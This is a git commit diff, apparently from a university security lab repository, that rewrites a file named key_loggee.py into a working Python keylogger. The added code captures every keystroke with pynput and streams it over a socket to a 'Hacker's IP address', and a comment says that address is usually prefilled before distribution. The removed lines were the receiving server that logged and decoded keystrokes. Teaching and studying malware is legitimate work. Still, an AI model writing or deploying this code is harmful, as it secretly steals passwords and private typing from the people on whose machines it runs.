50783b6dee99508602b7318556e67be68963c250
Jin Hong <jin.hong@uwa.edu.au>
2023-08-01 20:50:13 +0800

    updates to keyloggers

--- cits3006-labs/files/key_loggee.py
+++ cits3006-labs/files/key_loggee.py
@@ -1,50 +1,20 @@
+from pynput.keyboard import Listener, Key
 import socket
 
-host = '' #hacker IP address in string, actually don't need it
+host = '' #Hacker's IP address as a string
+#this would be prefilled usually before distribution
 port = 9999
 
 s = socket.socket()
-s.bind((host, port))
-s.listen(2)
+s.connect((host, port))
 
-def file_write(keys):
-    with open("keylogs.txt","a") as file:
-        for key in keys:
-            file.write(key)
+def press(key):
+    #print(key)
+    s.send(str(key).encode())
 
-print(host)
-conn, address = s.accept()
-print("Connected to Client: " + str(address))
-while True:
-    data = conn.recv(1024).decode()
-    file_write(str(data))
-    if not data:
-        break
-    if str(data) == 'Key.space':
-        data = ' '
-    if str(data) == 'Key.enter':
-        data = '\n'
-    if str(data) == 'Key.tab':
-        data = '\t'
-    if str(data) == 'Key.backspace':
-        data = ' [backspace] '
-    if str(data) == 'Key.shift' or str(data) == 'Key.shift_r':
-        data = ''
-    if str(data) == 'Key.ctrl' or str(data) == 'Key.ctrl_r':
-        data = ' [ctrl] '
-    if str(data) == 'Key.alt' or str(data) == 'Key.alt_r':
-        data = ' [alt] '
-    if str(data) == 'Key.cmd' or str(data) == 'Key.cmd_r':
-        data = ' [cmd] '
-    if str(data) == 'Key.caps_lock':
-        data = ' [caps lock] '
-    if str(data) == 'Key.left':
-        data = ' [left] '
-    if str(data) == 'Key.right':
-        data = ' [right] '
-    if str(data) == 'Key.up':
-        data = ' [up] '
-    if str(data) == 'Key.down':
-        data = ' [down] '
-    print(str(data).strip("'"), end='', flush=True)
-conn.close()
+def release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press = press, on_release = release) as listener:
+    listener.join()
